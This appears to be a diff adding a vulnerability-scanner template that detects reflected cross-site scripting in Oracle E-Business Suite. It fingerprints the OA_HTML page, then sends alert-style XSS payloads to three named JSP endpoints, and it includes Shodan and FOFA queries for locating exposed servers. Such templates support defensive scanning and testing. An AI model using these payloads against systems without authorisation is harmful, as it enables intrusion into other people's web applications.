@@ -1,0 +1,53 @@
+id: oracle-ebs-xss
+
+info:
+  name: Oracle E-Business Suite - Cross-Site Scripting
+  author: dhiyaneshDk
+  severity: medium
+  description: Oracle E-Business Suite is vulnerable to Cross Site Scripting.
+  reference:
+    - https://www.blackhat.com/docs/us-16/materials/us-16-Litchfield-Hackproofing-Oracle-eBusiness-Suite.pdf
+    - http://www.davidlitchfield.com/AssessingOraclee-BusinessSuite11i.pdf
+  metadata:
+    max-request: 3
+    shodan-query: html:"OA_HTML"
+    fofa-query: body="OA_HTML"
+  tags: oracle,xss,ebs
+
+flow: http(1) && http(2)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    redirects: true
+    matchers:
+      - type: word
+        part: response
+        words:
+          - "OA_HTML"
+        internal: true
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/OA_HTML/jtfLOVInProcess.jsp%3FAAA%3DAAAAAAAAAA%27%22%3E%3Csvg%2Fonload%3Dalert('{{randstr}}')%3E"
+      - "{{BaseURL}}/OA_HTML/oksAutoRenewalHelp.jsp%3Fthanks%3D%27%22%3E%3Csvg%2Fonload%3Dalert('{{randstr}}')%3E"
+      - "{{BaseURL}}/OA_HTML/ieuiMeetingErrorDisplay.jsp%3FErrCode%3D%27%22%3E%3Csvg%2Fonload%3Dalert('{{randstr}}')%3E"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "<svg/onload=alert('{{randstr}}')>"
+
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: header
+        words:
+          - "text/html"
+# digest: 490a0046304402207b8abcb8f8ddf14acea136f154139ee3c7076fe4ca9753c968032dfa0fa9367f02202c5d633ea9e0e42a09743be2c860437275f7736053734e52fd4744821b096c5d:922c64590222798bb761d5b6d8e72950
